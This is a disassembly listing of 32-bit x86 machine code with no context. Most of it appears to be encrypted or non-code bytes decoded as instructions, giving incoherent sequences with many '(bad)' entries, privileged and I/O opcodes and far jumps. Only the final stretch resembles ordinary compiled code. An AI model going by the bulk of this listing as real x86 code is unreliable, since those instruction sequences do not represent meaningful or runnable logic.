  41c160:	loop   0x41c0f3
  41c162:	add    dl,BYTE PTR [edx+esi*2-0x5610e5ec]
  41c169:	or     esi,DWORD PTR [edi]
  41c16b:	sti    
  41c16c:	push   ss
  41c16d:	and    dl,al
  41c16f:	sub    edi,esp
  41c171:	arpl   WORD PTR [edi],bx
  41c173:	lea    eax,[ebp+0x79b7b53]
  41c179:	scas   eax,DWORD PTR es:[edi]
  41c17a:	jnp    0x41c1e9
  41c17c:	iret   
  41c17d:	cmp    ch,BYTE PTR [eax+0x6f]
  41c180:	pop    edx
  41c181:	scas   al,BYTE PTR es:[edi]
  41c182:	sub    BYTE PTR [eax-0x50],bl
  41c185:	jp     0x41c147
  41c187:	aad    0xcf
  41c189:	mov    eax,ds:0x798deb6
  41c18e:	jns    0x41c1fc
  41c190:	shl    BYTE PTR [ecx-0x80],0xec
  41c194:	gs retf 0xe340
  41c198:	stos   DWORD PTR es:[edi],eax
  41c199:	int3   
  41c19a:	jnp    0x41c19b
  41c19c:	aaa    
  41c19d:	inc    eax
  41c19e:	rcr    DWORD PTR [ebp-0x64],0x9f
  41c1a2:	mov    ds:0x25d9f260,eax
  41c1a7:	stos   BYTE PTR es:[edi],al
  41c1a8:	dec    ebp
  41c1a9:	loope  0x41c187
  41c1ab:	mov    bl,0x7f
  41c1ad:	imul   ebp,DWORD PTR [ebx],0x30afe7f9
  41c1b3:	js     0x41c212
  41c1b5:	xchg   esp,eax
  41c1b6:	mov    ebx,0x756c4755
  41c1bb:	push   ecx
  41c1bc:	add    eax,0x262c7d26
  41c1c1:	fnstenv [ebp+0x406fdfd9]
  41c1c7:	jp     0x41c1a6
  41c1c9:	cmp    ebx,esp
  41c1cb:	out    dx,eax
  41c1cc:	ss repz icebp 
  41c1cf:	mov    ecx,0x7d3f7729
  41c1d4:	bound  ebp,QWORD PTR [eax-0x4b]
  41c1d7:	data16 jae 0x41c205
  41c1da:	lods   eax,DWORD PTR ds:[esi]
  41c1db:	loope  0x41c1e8
  41c1dd:	dec    esi
  41c1de:	jmp    0x9b6db5a4
  41c1e3:	mov    bh,0xb
  41c1e5:	xor    edx,esp
  41c1e7:	and    esp,DWORD PTR [esi]
  41c1e9:	shl    dl,0xbd
  41c1ec:	lea    edx,gs:[edx+edx*8]
  41c1f0:	pop    es
  41c1f1:	dec    ecx
  41c1f2:	fs pop ecx
  41c1f4:	xor    DWORD PTR [ebx-0x6a],ebx
  41c1f7:	fdivr  DWORD PTR [edi-0x7e]
  41c1fa:	cdq    
  41c1fb:	mov    ds:0x9782859d,eax
  41c200:	mov    edx,0x97519ff
  41c205:	push   ds
  41c206:	xchg   ebx,eax
  41c207:	pop    edx
  41c208:	ror    BYTE PTR fs:[edx+esi*1+0x6119639],cl
  41c210:	sub    DWORD PTR [ebp+0x74],ebp
  41c213:	out    0xb8,eax
  41c215:	and    DWORD PTR ds:0x250269,edx
  41c21b:	and    esi,edx
  41c21d:	shl    DWORD PTR [ebp-0x38],0x7d
  41c221:	mov    eax,0x5a4f2b3a
  41c226:	sub    BYTE PTR [edi+0x4933f5a],ah
  41c22c:	cmc    
  41c22d:	or     ch,BYTE PTR [edi]
  41c22f:	test   eax,0x3acaa893
  41c234:	cmp    edi,ebp
  41c236:	xor    bh,ch
  41c238:	dec    eax
  41c239:	retf   
  41c23a:	adc    DWORD PTR [eax-0x61],edx
  41c23d:	adc    ebp,edx
  41c23f:	(bad)  
  41c241:	(bad)  [ebx-0x28]
  41c244:	add    ebp,esi
  41c246:	cmp    eax,0x5900309e
  41c24b:	xchg   edi,eax
  41c24c:	test   eax,0xd6fbcd0b
  41c251:	adc    al,0xe
  41c253:	pop    ss
  41c254:	mov    fs,WORD PTR [edx+eax*4+0x112906a7]
  41c25b:	fnstenv [eax+0x78]
  41c25e:	out    0x1d,eax
  41c260:	adc    bh,bh
  41c262:	inc    edx
  41c263:	dec    edi
  41c264:	hlt    
  41c265:	xchg   ebp,eax
  41c266:	adc    DWORD PTR [edx+esi*1+0x399844f4],eax
  41c26d:	adc    cl,BYTE PTR [edi-0x4c908c8e]
  41c273:	dec    eax
  41c274:	jl     0x41c278
  41c276:	mov    al,ds:0x5d985841
  41c27b:	mov    DWORD PTR [ecx-0x4be3927c],edx
  41c281:	scas   eax,DWORD PTR es:[edi]
  41c282:	lock jb 0x41c24d
  41c285:	jmp    0x41c251
  41c287:	(bad)
  41c28c:	rcr    BYTE PTR [edi-0xda29777],cl
  41c292:	cs aam 0x15
  41c295:	cmp    BYTE PTR [edx-0x3c585dbf],dh
  41c29b:	pop    es
  41c29c:	jl     0x41c30f
  41c29e:	pushf  
  41c29f:	and    al,ah
  41c2a1:	popf   
  41c2a2:	idiv   BYTE PTR [edx+0x74]
  41c2a5:	push   0x9f3a60d4
  41c2aa:	loop   0x41c259
  41c2ac:	mov    BYTE PTR [esi-0x606a933f],bl
  41c2b2:	mov    dl,0xc1
  41c2b4:	push   ebx
  41c2b5:	sti    
  41c2b6:	sbb    al,0xca
  41c2b8:	jbe    0x41c2a4
  41c2ba:	or     BYTE PTR [ecx],dh
  41c2bc:	add    ebx,esp
  41c2be:	mov    DWORD PTR [ecx-0x6e691c3a],esp
  41c2c4:	sbb    eax,0x947fbf52
  41c2c9:	shl    BYTE PTR [esi-0x1c],1
  41c2cc:	jne    0x41c315
  41c2ce:	xlat   BYTE PTR ds:[ebx]
  41c2cf:	test   al,0x5
  41c2d1:	adc    bh,BYTE PTR [esi+0x243f4145]
  41c2d7:	dec    ebp
  41c2d8:	push   ecx
  41c2d9:	jb     0x41c30f
  41c2db:	call   0x97b1:0x74ed8faf
  41c2e2:	or     BYTE PTR [edi-0x3343b089],ch
  41c2e8:	xchg   esi,eax
  41c2e9:	rcr    BYTE PTR [edx-0xe201ca6],0xf3
  41c2f0:	mov    dl,0xe
  41c2f2:	push   ecx
  41c2f3:	xchg   edi,eax
  41c2f4:	stos   DWORD PTR es:[edi],eax
  41c2f5:	or     esi,DWORD PTR [eax+0x5b]
  41c2f8:	pop    esp
  41c2f9:	imul   edx,DWORD PTR [edx+0x58e08a69],0xffffffef
  41c300:	popa   
  41c301:	rep lods eax,DWORD PTR ds:[esi]
  41c303:	call   0xc2963e6d
  41c308:	mov    ch,0xdf
  41c30a:	pop    ecx
  41c30b:	ret    0x65e3
  41c30e:	aas    
  41c30f:	jmp    0x41c29f
  41c311:	mov    eax,ds:0xc4a36855
  41c316:	dec    edx
  41c317:	dec    esp
  41c318:	xor    al,0x2
  41c31a:	cli    
  41c31b:	add    dh,BYTE PTR [edi+0x1a]
  41c31e:	ficom  DWORD PTR [ebx-0x207b811c]
  41c324:	jne    0x41c2d0
  41c326:	(bad)  
  41c327:	aam    0x6b
  41c329:	mov    ds:0x4f79b3a9,eax
  41c32e:	mov    ebp,0x789ae590
  41c333:	in     eax,dx
  41c334:	pop    esp
  41c335:	inc    ebx
  41c336:	sub    bl,0xff
  41c339:	push   ecx
  41c33a:	sar    BYTE PTR [ecx+0x11886965],0x25
  41c341:	mov    ah,0x73
  41c343:	adc    edx,0x53413b85
  41c349:	mov    ebp,0xb44a9d47
  41c34e:	pop    ebp
  41c34f:	ficomp DWORD PTR [eax+0x7a]
  41c352:	and    BYTE PTR [ecx-0x7e29fb75],ah
  41c358:	ds mov dl,0x72
  41c35b:	mov    gs,WORD PTR [esi+0x34]
  41c35e:	jge    0x41c3b1
  41c360:	xchg   ebp,eax
  41c361:	and    al,BYTE PTR [edx-0x23672259]
  41c367:	cmp    DWORD PTR [ecx+esi*4+0x73c14e5f],0xb
  41c36f:	cli    
  41c370:	sbb    DWORD PTR [ebx],0x4a62713c
  41c376:	mov    edi,0xb7c6cc8a
  41c37b:	test   BYTE PTR [ebx-0x61],cl
  41c37e:	sbb    ecx,eax
  41c380:	mul    ah
  41c382:	mov    ah,0xca
  41c384:	outs   dx,BYTE PTR ds:[esi]
  41c385:	push   ecx
  41c386:	or     BYTE PTR [ebx-0x116d764f],0x20
  41c38d:	into   
  41c38e:	dec    edx
  41c38f:	jmp    0x959b:0x93afdce3
  41c396:	fnsavew [ebx+0x2d]
  41c39a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c39b:	mov    ds:0xceefe90e,al
  41c3a0:	(bad)  
  41c3a1:	sub    BYTE PTR [ebx+eiz*4],dh
  41c3a4:	je     0x41c360
  41c3a6:	les    ebp,FWORD PTR [edx-0x5f]
  41c3a9:	push   edx
  41c3aa:	sub    DWORD PTR [edx],0xffffff8d
  41c3ad:	xchg   ecx,eax
  41c3ae:	idiv   DWORD PTR ds:0xaee6d2dc
  41c3b4:	xchg   DWORD PTR [ecx+edx*8+0x48fb8fb4],ecx
  41c3bb:	(bad)  
  41c3bc:	xor    DWORD PTR [ecx+edx*4-0x48],edx
  41c3c0:	cmp    eax,0xff7f174a
  41c3c5:	sub    cl,bh
  41c3c7:	into   
  41c3c8:	lahf   
  41c3c9:	xor    al,BYTE PTR [eax+esi*8+0x31]
  41c3cd:	xchg   BYTE PTR [edx+0x29],ch
  41c3d0:	sub    esp,DWORD PTR [ebx-0x57]
  41c3d3:	xchg   edi,eax
  41c3d4:	mov    BYTE PTR [ecx+0x20a8d892],al
  41c3da:	nop
  41c3db:	adc    BYTE PTR cs:[edi],0x66
  41c3df:	jecxz  0x41c387
  41c3e1:	add    BYTE PTR [edx-0x77],al
  41c3e4:	xchg   edx,eax
  41c3e5:	cwde   
  41c3e6:	inc    esp
  41c3e7:	lods   eax,DWORD PTR ds:[esi]
  41c3e8:	or     edi,DWORD PTR [edx+ecx*8]
  41c3eb:	sub    edx,0x7d
  41c3ee:	xchg   ebx,eax
  41c3ef:	stos   DWORD PTR es:[edi],eax
  41c3f0:	xchg   ecx,eax
  41c3f1:	fcom   DWORD PTR ds:0x9135a927
  41c3f7:	and    al,0x7f
  41c3f9:	inc    ebp
  41c3fa:	hlt    
  41c3fb:	fadd   QWORD PTR [ecx-0xe4423df]
  41c401:	sbb    DWORD PTR [ebx-0x78],eax
  41c404:	inc    esi
  41c405:	pop    esi
  41c406:	fsub   st(1),st
  41c408:	jnp    0x41c47c
  41c40a:	jecxz  0x41c3c5
  41c40c:	or     BYTE PTR [edi+0xb],ah
  41c40f:	ds jecxz 0x41c3ed
  41c412:	lods   eax,DWORD PTR ds:[esi]
  41c413:	or     ch,BYTE PTR [esi+0x12c9ba72]
  41c419:	hlt    
  41c41a:	cmp    al,0xa1
  41c41c:	sar    DWORD PTR ss:[edi+0x6e],0x5
  41c421:	pop    eax
  41c422:	shr    DWORD PTR [eax+0xf],1
  41c425:	hlt    
  41c426:	ds and eax,esp
  41c429:	xor    al,0x13
  41c42b:	jmp    0x41c3b7
  41c42d:	cmc    
  41c42e:	push   esp
  41c42f:	inc    edi
  41c430:	pop    edx
  41c431:	loopne 0x41c49b
  41c433:	push   0xffffff8a
  41c435:	(bad)  
  41c436:	jl     0x41c453
  41c438:	jg     0x41c474
  41c43a:	test   DWORD PTR [ecx+0x7b],edi
  41c43d:	ja     0x41c3ef
  41c43f:	jle    0x41c3e2
  41c441:	pop    edi
  41c442:	test   ebp,0x8ab765b2
  41c448:	outs   dx,BYTE PTR ds:[esi]
  41c449:	or     BYTE PTR [ecx+eax*2+0x1a],ch
  41c44d:	adc    eax,0x429eded5
  41c452:	iret   
  41c453:	cmp    al,0x40
  41c455:	pop    esp
  41c456:	out    0x1d,al
  41c458:	mov    dh,al
  41c45a:	and    al,bl
  41c45c:	clc    
  41c45d:	mov    eax,ds:0x1c62044f
  41c462:	adc    ecx,DWORD PTR [eax+0x1b674846]
  41c468:	aaa    
  41c469:	lods   al,BYTE PTR ds:[esi]
  41c46a:	mov    DWORD PTR [ebp-0x12],esp
  41c46d:	es xor al,0x95
  41c470:	inc    BYTE PTR [ecx-0x3d]
  41c473:	and    BYTE PTR [ebp-0x681c0302],dl
  41c479:	push   0x7
  41c47b:	wrmsr  
  41c47d:	lods   al,BYTE PTR ds:[esi]
  41c47e:	inc    edi
  41c47f:	mov    eax,ds:0x550e3cb
  41c484:	mov    edx,0x9d5f64cd
  41c489:	jecxz  0x41c43b
  41c48b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c48c:	mov    esp,DWORD PTR [edx+0xb96fd0d]
  41c492:	lds    esi,FWORD PTR ds:0xe218815c
  41c498:	inc    ecx
  41c499:	(bad)
  41c49d:	sar    dh,0x2c
  41c4a0:	sub    al,0xfc
  41c4a2:	xchg   ecx,eax
  41c4a3:	pusha  
  41c4a4:	fmul   DWORD PTR [ebx+eax*8+0x18]
  41c4a8:	pop    ss
  41c4a9:	push   edi
  41c4aa:	mov    ch,0xe6
  41c4ac:	mov    esi,0xf540241c
  41c4b1:	ja     0x41c4cb
  41c4b3:	cwde   
  41c4b4:	call   0x414dd5
  41c4b9:	jmp    0x41c888
  41c4be:	inc    edi
  41c4bf:	and    edi,DWORD PTR [eax]
  41c4c1:	sbb    DWORD PTR [ebx+eax*1],esi
  41c4c4:	daa    
  41c4c5:	and    cl,BYTE PTR [ebx]
  41c4c7:	cdq    
  41c4c8:	lahf   
  41c4c9:	jo     0x41c4a8
  41c4cb:	or     BYTE PTR [eax],0x6a
  41c4ce:	dec    edx
  41c4cf:	jae    0x41c4e7
  41c4d1:	sbb    BYTE PTR [edx+edx*1-0x4391e7e8],bh
  41c4d8:	iret   
  41c4d9:	sub    BYTE PTR [ecx-0xe],ah
  41c4dc:	push   edx
  41c4dd:	dec    edx
  41c4de:	sub    ecx,DWORD PTR [edx+0x7f]
  41c4e1:	es dec eax
  41c4e3:	fidivr DWORD PTR [ecx+ebx*1+0x3c]
  41c4e7:	dec    esp
  41c4e8:	repz xchg ebp,eax
  41c4ea:	sbb    al,0xf
  41c4ec:	and    al,BYTE PTR [esi+0x101e9613]
  41c4f2:	and    BYTE PTR [ebx-0x80],cl
  41c4f5:	add    BYTE PTR [edi-0x55],dl
  41c4f8:	inc    esp
  41c4f9:	and    ebx,DWORD PTR [ecx-0x48e91c64]
  41c4ff:	and    BYTE PTR [ebp-0x39c9be44],dl
  41c505:	nop
  41c506:	dec    ebp
  41c507:	mov    ecx,0xdf6408b1
  41c50c:	mov    ch,0xc4
  41c50e:	inc    edi
  41c50f:	mov    bl,0xb8
  41c511:	pop    ebx
  41c512:	jmp    0x5389:0x5c4dd429
  41c519:	(bad)  
  41c51a:	fisubr DWORD PTR [ebx]
  41c51c:	add    eax,DWORD PTR [esi+0x6e]
  41c51f:	sbb    BYTE PTR [edi],ah
  41c521:	lahf   
  41c522:	pop    ds
  41c523:	sub    ebp,DWORD PTR [ecx+0x50]
  41c526:	call   0x428fdb50
  41c52b:	xor    al,dl
  41c52d:	in     al,0x81
  41c52f:	cli    
  41c530:	add    esp,0xfa9f1ca0
  41c536:	pop    ecx
  41c537:	lods   eax,DWORD PTR ds:[esi]
  41c538:	scas   ax,WORD PTR es:[edi]
  41c53a:	inc    esp
  41c53b:	ins    DWORD PTR es:[edi],dx
  41c53c:	dec    ebp
  41c53d:	shl    DWORD PTR [esi],1
  41c53f:	xor    DWORD PTR [edx+0x33],eax
  41c542:	rol    DWORD PTR ds:0x3365f0a6,cl
  41c548:	ins    DWORD PTR es:[edi],dx
  41c549:	mov    esi,0x5b2e0eda
  41c54e:	mov    BYTE PTR [edi+ebx*1],dl
  41c551:	ins    BYTE PTR es:[edi],dx
  41c552:	lahf   
  41c553:	into   
  41c554:	pop    ebp
  41c555:	dec    eax
  41c556:	adc    eax,0x3d60ac6f
  41c55b:	das    
  41c55c:	push   esp
  41c55d:	dec    ecx
  41c55e:	cwde   
  41c55f:	out    dx,al
  41c560:	outs   dx,BYTE PTR ds:[esi]
  41c561:	enter  0x1830,0x12
  41c565:	mov    bh,0x1e
  41c567:	pop    esi
  41c568:	fwait
  41c569:	popf   
  41c56a:	pop    ds
  41c56b:	mov    ds:0x8a6d05c1,eax
  41c570:	xlat   BYTE PTR ds:[ebx]
  41c571:	scas   al,BYTE PTR es:[edi]
  41c572:	inc    eax
  41c573:	or     ebp,DWORD PTR [ebx-0xe]
  41c576:	(bad)  [edx+eiz*2-0x6ee6e8e8]
  41c57d:	or     al,0xc0
  41c57f:	ret    0xd1fb
  41c582:	jg     0x41c5ce
  41c584:	mov    esi,0x4c23f69d
  41c589:	setp   BYTE PTR [ecx+0x7291bbb4]
  41c590:	mov    esi,0x6bd7a0f4
  41c595:	jbe    0x41c5e1
  41c597:	xchg   ecx,eax
  41c598:	and    DWORD PTR [ebp-0x701723c4],esi
  41c59e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c59f:	adc    BYTE PTR [eax],al
  41c5a1:	fst    DWORD PTR [ebp+0x1a]
  41c5a4:	sti    
  41c5a5:	fs dec ecx
  41c5a7:	call   0x18975700
  41c5ac:	imul   edx,DWORD PTR [esi],0x29
  41c5af:	fsubr  DWORD PTR [ebx-0x8a86b9]
  41c5b5:	fiadd  DWORD PTR [eax-0x36]
  41c5b8:	xor    BYTE PTR [ecx],bl
  41c5ba:	ret    0xf448
  41c5bd:	call   0x602d113c
  41c5c2:	out    0xb2,al
  41c5c4:	retf   0x1163
  41c5c7:	(bad)  [edx-0x51]
  41c5ca:	jmp    0x41c5fa
  41c5cc:	add    DWORD PTR [edx],edx
  41c5ce:	fstp   DWORD PTR [ebx-0x24bdbee8]
  41c5d4:	xor    edi,ecx
  41c5d6:	sbb    BYTE PTR [esi],al
  41c5d8:	and    dh,BYTE PTR [ebp-0x65344107]
  41c5de:	add    al,0xe0
  41c5e0:	loop   0x41c636
  41c5e2:	cmp    eax,DWORD PTR [edx+0x1c455152]
  41c5e8:	dec    edi
  41c5e9:	sub    al,0xa0
  41c5eb:	test   DWORD PTR [ebx+0x32821698],esp
  41c5f1:	mov    ecx,0x3c0bc264
  41c5f6:	dec    ebp
  41c5f7:	and    DWORD PTR [edx+0x6a],esi
  41c5fa:	or     al,0x3f
  41c5fc:	jecxz  0x41c61d
  41c5fe:	push   cs
  41c5ff:	pop    eax
  41c600:	aas    
  41c601:	cmp    eax,0xab7eb081
  41c606:	fisubr WORD PTR [edx+0x47]
  41c609:	inc    esi
  41c60a:	das    
  41c60b:	fmul   QWORD PTR [edi-0x37]
  41c60e:	les    edx,FWORD PTR [ecx-0xe]
  41c611:	sbb    DWORD PTR [ecx+0x2e],ebp
  41c614:	aad    0x70
  41c616:	sub    ebx,eax
  41c618:	push   ss
  41c619:	push   edx
  41c61a:	mov    dh,0x62
  41c61c:	test   esi,esp
  41c61e:	sbb    BYTE PTR [esi-0x5e],0x4b
  41c622:	jle    0x41c67b
  41c624:	pop    edi
  41c625:	lahf   
  41c626:	inc    esi
  41c627:	aas    
  41c628:	mov    ?,WORD PTR [edi-0x3a]
  41c62b:	scas   al,BYTE PTR es:[edi]
  41c62c:	mov    ebx,0x419602d2
  41c631:	pushw  ds
  41c633:	sub    DWORD PTR [ebx+0x19],eax
  41c636:	inc    edx
  41c637:	push   edx
  41c638:	dec    edx
  41c639:	dec    eax
  41c63a:	fcmovu st,st(6)
  41c63c:	ja     0x41c698
  41c63e:	and    cl,BYTE PTR [ebp+0x1b6903b0]
  41c644:	fmul   QWORD PTR [ebx+ecx*2]
  41c647:	push   es
  41c648:	loope  0x41c668
  41c64a:	in     al,0x9c
  41c64c:	sbb    al,0x3c
  41c64e:	outs   dx,DWORD PTR ds:[esi]
  41c64f:	add    BYTE PTR [ebx],dh
  41c651:	sbb    BYTE PTR fs:[edx],al
  41c654:	jl     0x41c5fd
  41c656:	lahf   
  41c657:	fwait
  41c658:	call   0x491596a6
  41c65d:	adc    DWORD PTR [eax+eiz*4+0x736737c1],ebx
  41c664:	add    eax,0xbcd08d1f
  41c669:	push   edx
  41c66a:	inc    edx
  41c66b:	jb     0x41c5fa
  41c66d:	and    ah,BYTE PTR [eax]
  41c66f:	xlat   BYTE PTR ds:[ebx]
  41c670:	mov    fs,WORD PTR [ecx-0x27]
  41c673:	outs   dx,BYTE PTR ds:[esi]
  41c674:	ror    DWORD PTR [ebx],0xb5
  41c677:	imul   ecx,edi,0x37969b1a
  41c67d:	push   esi
  41c67e:	shl    bl,0xa0
  41c681:	enter  0x534d,0xc9
  41c685:	fidivr WORD PTR [ebp-0x17be053a]
  41c68b:	adc    eax,0xfb5447c9
  41c690:	sub    al,bl
  41c692:	jle    0x41c69c
  41c694:	lea    ecx,[ebx-0x35deb914]
  41c69a:	inc    esp
  41c69b:	pop    ss
  41c69c:	mov    ecx,0x46ff7c24
  41c6a1:	push   0xffffffd0
  41c6a3:	(bad)  
  41c6a4:	sub    eax,0xbf9c24be
  41c6a9:	das    
  41c6aa:	aam    0xcf
  41c6ac:	lahf   
  41c6ad:	pop    ecx
  41c6ae:	das    
  41c6af:	aaa    
  41c6b0:	fdivrp st(0),st
  41c6b2:	xchg   edx,eax
  41c6b3:	es dec edi
  41c6b5:	pop    ecx
  41c6b6:	fcomip st,st(2)
  41c6b8:	mov    cl,dl
  41c6ba:	ds xor al,0xd6
  41c6bd:	scas   eax,DWORD PTR es:[edi]
  41c6be:	mov    ds:0xa5c0deef,eax
  41c6c3:	xor    edx,ebx
  41c6c5:	adc    eax,0x6152d343
  41c6ca:	jb     0x41c6d2
  41c6cc:	imul   eax,DWORD PTR [ebp+0x32],0x1c
  41c6d0:	pop    es
  41c6d1:	sub    al,0xda
  41c6d3:	or     eax,0x91c96e66
  41c6d8:	jmp    0x41c681
  41c6da:	or     eax,0x5ffd7a3c
  41c6df:	out    0x76,al
  41c6e1:	or     bl,al
  41c6e3:	sbb    al,0x3f
  41c6e5:	dec    ebp
  41c6e6:	and    al,0x1b
  41c6e8:	cmp    ecx,eax
  41c6ea:	xor    al,0xa
  41c6ec:	sbb    DWORD PTR [ecx],eax
  41c6ee:	jae    0x41c680
  41c6f0:	push   ss
  41c6f1:	sub    al,0x7d
  41c6f3:	cmp    al,0xd2
  41c6f5:	je     0x41c70c
  41c6f7:	mov    ebx,0x8d012d30
  41c6fc:	shl    BYTE PTR [edi],0x69
  41c6ff:	or     eax,0x988f6603
  41c704:	adc    DWORD PTR [esi-0x4d],ecx
  41c707:	ja     0x41c6d3
  41c709:	pop    ds
  41c70a:	in     al,dx
  41c70b:	push   ecx
  41c70c:	ds stos DWORD PTR es:[edi],eax
  41c70e:	mov    cl,dl
  41c710:	retf   
  41c711:	aas    
  41c712:	mov    ds:0xe64387e7,eax
  41c717:	lods   al,BYTE PTR ds:[esi]
  41c718:	sub    eax,edx
  41c71a:	add    esi,DWORD PTR [edi]
  41c71c:	or     eax,0xe675161c
  41c721:	or     al,0xf2
  41c723:	mov    BYTE PTR [eax+0x61b71c9a],0x37
  41c72a:	aad    0xcd
  41c72c:	das    
  41c72d:	mov    ecx,0x7b6794a2
  41c732:	inc    edx
  41c733:	lods   al,BYTE PTR ds:[esi]
  41c735:	sub    BYTE PTR [eax+esi*2-0x4d],0x70
  41c73a:	pop    ebx
  41c73b:	push   esp
  41c73c:	jo     0x41c6c4
  41c73e:	js     0x41c700
  41c740:	inc    esp
  41c741:	fbstp  TBYTE PTR ds:0x92c69199
  41c747:	inc    ebx
  41c748:	ins    DWORD PTR es:[edi],dx
  41c749:	scas   al,BYTE PTR es:[edi]
  41c74a:	sbb    ch,ah
  41c74c:	and    BYTE PTR [ebx+0x2c],0x1
  41c750:	aas    
  41c751:	xor    ecx,DWORD PTR [edx+0x11]
  41c754:	jecxz  0x41c736
  41c756:	adc    eax,0x7bd6371a
  41c75b:	call   0x9d4ec946
  41c760:	ror    BYTE PTR [edx+0x7d49da22],1
  41c766:	das    
  41c767:	add    ebp,ecx
  41c769:	not    BYTE PTR [edi+ecx*4+0x5fe610a9]
  41c770:	aam    0xa3
  41c772:	push   es
  41c773:	mov    BYTE PTR [edx-0x5bbcc574],ah
  41c779:	shl    BYTE PTR [esi+0x0],0xff
  41c77d:	lods   al,BYTE PTR ds:[esi]
  41c77e:	neg    DWORD PTR [ebp+0x7c941bd4]
  41c784:	lahf   
  41c785:	test   eax,0xf600aaf1
  41c78a:	jecxz  0x41c736
  41c78c:	int3   
  41c78d:	dec    esp
  41c78e:	xor    al,BYTE PTR [ecx]
  41c790:	and    esp,DWORD PTR [ebp+0x7a]
  41c793:	sub    cl,ch
  41c795:	daa    
  41c796:	mov    edx,0xf9d41227
  41c79b:	add    edi,ecx
  41c79d:	xchg   DWORD PTR [eax+0x42],esp
  41c7a0:	push   0x2305f793
  41c7a5:	mov    BYTE PTR [edx+ebp*1-0x45],ch
  41c7a9:	mov    BYTE PTR [ebx],bl
  41c7ab:	cmc    
  41c7ac:	ins    DWORD PTR es:[edi],dx
  41c7ad:	(bad)  
  41c7ae:	xchg   ecx,eax
  41c7af:	or     eax,0x4fba7d3f
  41c7b4:	mov    DWORD PTR gs:[eax+0x18e7056c],edx
  41c7bb:	mov    bl,0x61
  41c7bd:	mov    dh,0x94
  41c7bf:	cdq    
  41c7c0:	sub    eax,0xb7a98b7a
  41c7c5:	add    al,0x8e
  41c7c7:	in     al,0x44
  41c7c9:	inc    edx
  41c7ca:	das    
  41c7cb:	call   0xda8ae3a4
  41c7d0:	std    
  41c7d1:	cwde   
  41c7d2:	cmp    edi,eax
  41c7d4:	enter  0xbb9b,0x45
  41c7d8:	loop   0x41c82d
  41c7da:	outs   dx,BYTE PTR ds:[esi]
  41c7db:	pop    esi
  41c7dc:	(bad)  
  41c7dd:	fld    DWORD PTR [eax+0x74]
  41c7e0:	dec    esp
  41c7e1:	mov    dl,0xa5
  41c7e3:	sahf   
  41c7e4:	add    DWORD PTR [eax-0xb],esi
  41c7e7:	xor    BYTE PTR [edx-0xb408eaf],0x50
  41c7ee:	or     eax,0x60bee35e
  41c7f3:	in     eax,0x45
  41c7f5:	jbe    0x41c7a6
  41c7f7:	xchg   ebx,eax
  41c7f8:	out    dx,eax
  41c7f9:	call   0x74667a0d
  41c7fe:	ret    0x8803
  41c801:	sbb    DWORD PTR [edi+0x27],eax
  41c804:	imul   edi,esp,0xbcea55bd
  41c80a:	sbb    DWORD PTR [esi-0x5],ebx
  41c80d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c80e:	test   eax,0xcea07e0a
  41c813:	mov    ah,0xa9
  41c815:	fmul   QWORD PTR [ebp+0x1feb5a0d]
  41c81b:	clc    
  41c81c:	jns    0x41c7ff
  41c81e:	push   edx
  41c81f:	jmp    0x586:0xedf77d7b
  41c826:	sub    eax,0xac05476c
  41c82b:	pusha  
  41c82c:	nop
  41c82d:	mov    ecx,DWORD PTR [edi+0x74]
  41c830:	fwait
  41c831:	addr16 jnp 0x41c833
  41c834:	in     al,dx
  41c835:	push   esp
  41c836:	rcr    BYTE PTR [esi],0xd4
  41c839:	push   esi
  41c83a:	and    DWORD PTR [ecx],edi
  41c83c:	mov    al,0xa8
  41c83e:	rcr    DWORD PTR [edi],0x20
  41c841:	stos   BYTE PTR es:[edi],al
  41c842:	sbb    edi,DWORD PTR [esi-0x5b84f259]
  41c848:	xor    edi,edi
  41c84a:	lock stos BYTE PTR es:[edi],al
  41c84c:	adc    DWORD PTR [edx-0x77],esi
  41c84f:	pop    edx
  41c850:	dec    eax
  41c851:	xchg   esp,eax
  41c852:	mov    ch,0x67
  41c854:	push   eax
  41c855:	sbb    eax,0x864e330a
  41c85a:	xor    ah,dl
  41c85c:	sbb    DWORD PTR [ebp+0x7],esp
  41c85f:	and    eax,0xcfcc7ed9
  41c864:	ret    
  41c865:	ret    
  41c866:	sbb    BYTE PTR [ecx+0x6c],dl
  41c869:	xlat   BYTE PTR ds:[ebx]
  41c86a:	sar    DWORD PTR [eax+0x7c],0x16
  41c86e:	in     eax,0x63
  41c870:	jmp    0x9189:0xde42fa09
  41c877:	ret    
  41c878:	fidiv  WORD PTR [eax+0x35ad7166]
  41c87e:	inc    ebx
  41c87f:	lds    eax,FWORD PTR ds:0x4875b9c9
  41c885:	lahf   
  41c886:	test   DWORD PTR [edi+edi*8+0x74],edi
  41c88a:	and    al,0x74
  41c88c:	push   DWORD PTR [esp+0x74]
  41c890:	push   DWORD PTR [esp+0x24]
  41c894:	push   DWORD PTR [esp+0x24]
  41c898:	call   0x415a06
  41c89d:	mov    edx,DWORD PTR [esp+0x18]
  41c8a1:	mov    eax,DWORD PTR [esp+0x1c]
  41c8a5:	mov    ecx,DWORD PTR [esp+0x18]
  41c8a9:	mov    edi,DWORD PTR [esp+0x1c]
  41c8ad:	shrd   edx,eax,0x2
  41c8b1:	shr    eax,0x2
  41c8b4:	shl    ecx,0x1e
  41c8b7:	xor    ecx,ecx
  41c8b9:	mov    eax,0x329e695d
  41c8be:	xor    edx,eax
  41c8c0:	or     ecx,edx
  41c8c2:	mov    edx,DWORD PTR [esp+0x5c]
  41c8c6:	mov    DWORD PTR [edx],ecx
  41c8c8:	mov    ecx,DWORD PTR [esp+0x18]
  41c8cc:	mov    edx,DWORD PTR [esp+0x1c]
  41c8d0:	shrd   ecx,edx,0x2
  41c8d4:	xor    ecx,eax
  41c8d6:	mov    eax,DWORD PTR [esp+0x18]
  41c8da:	shl    eax,0x1e
  41c8dd:	shr    edx,0x2
  41c8e0:	mov    edx,DWORD PTR [esp+0x1c]
  41c8e4:	xor    eax,eax
  41c8e6:	or     eax,ecx
  41c8e8:	mov    ecx,DWORD PTR [esp+0x68]
  41c8ec:	mov    DWORD PTR [ecx],eax
  41c8ee:	mov    eax,DWORD PTR [esp+0x68]
  41c8f2:	mov    ecx,DWORD PTR [esp+0x68]
  41c8f6:	mov    eax,DWORD PTR [eax]
  41c8f8:	cmp    eax,DWORD PTR [ecx]
  41c8fa:	jne    0x41d531
  41c900:	mov    eax,DWORD PTR [esp+0x5c]
  41c904:	mov    ecx,DWORD PTR [esp+0x5c]
